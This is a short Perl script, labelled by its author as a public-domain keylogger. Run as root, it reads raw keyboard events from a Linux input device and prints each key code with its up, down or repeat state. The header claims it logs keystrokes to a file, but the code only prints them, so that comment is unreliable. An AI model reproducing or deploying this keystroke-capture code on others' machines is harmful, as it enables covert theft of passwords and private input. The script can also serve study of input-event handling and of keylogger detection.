#!/usr/bin/perl -w

#This is a keylogger which simply records every key pressed and logs it to a 
#file. You may need to change the input file, take a look in /dev/input/by-path/
#to see what's avaliable.

#This code is public domain.

use strict;

my $DEV = '/dev/input/event4';

if (!-r $DEV) {
	print "Cannot read $DEV\n";
	print "Are you root?\n";
	exit 1;
}

open FILE,$DEV;

while (1) {
    my $line = "";
    sysread(FILE,$line,16);
    my @vals = split(//,$line);

    if (ord($vals[10]) != 0) {
        interpret(ord($vals[10]),ord($vals[12]));
    }
}

close FILE;

sub interpret {
    my $keycode = shift;
    my $state = shift;
    #state:
    #0 -> key up
    #1 -> key down
    #2 -> key repeat (held down)

	if ($state == 0) {
	   	print "up $keycode\n";
	}elsif ($state == 1) {
	    print "down $keycode\n";
	}elsif ($state ==2) {
	    print "repeate $keycode\n";
	}

}


